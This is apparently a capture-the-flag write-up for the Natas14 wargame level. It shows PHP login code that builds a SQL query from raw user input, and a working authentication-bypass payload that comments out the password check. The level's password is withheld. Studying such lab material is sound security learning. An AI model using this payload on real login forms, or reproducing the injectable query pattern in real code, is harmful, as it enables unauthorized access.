# Natas14
#natas #sql-injection
## Vulnerability:
SQL injection, allowing attacker to bypass the login mechanism and access to the web application without valid credentials.
## Technique:
#### Steps:
###### 1) Analyzing the web application
**Screenshot:**

<img width="1335" height="467" alt="image" src="https://github.com/user-attachments/assets/fc187317-8c56-4d34-9728-cb0a4fb5770f" />

**Source code:**
```php
<?php

if (array_key_exists("username", $_REQUEST)) {

    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * FROM users WHERE username=\"" . $_REQUEST["username"] . "\" 
              AND password=\"" . $_REQUEST["password"] . "\"";

    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {
        echo "Successful login! The password for natas15 is <censored><br>";
    } else {
        echo "Access denied!<br>";
    }

    mysqli_close($link);

} else {

?>
```
The web application uses MySQL database to store user credentials, and it concatenates user input directly to the query without sanitization, making the application vulnerable to SQL injection.
###### 2) Performing SQL injection attack
**Payload:**
```
" OR 1 = 1 #
```
This modifies the SQL query logic:
```SQL
SELECT * FROM users 
WHERE username="" OR 1=1 #"AND password=""
```
Because `1=1` is always true and `#` comments out the remaining query, the password condition is ignored, allowing authentication bypass.
**Result:**

<img width="1158" height="309" alt="image" src="https://github.com/user-attachments/assets/e0097cb4-49f4-42b9-a5f2-8d179db88eaa" />

## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas13](./Natas13.md)
## Next Level:
[Natas15](./Natas15.md)
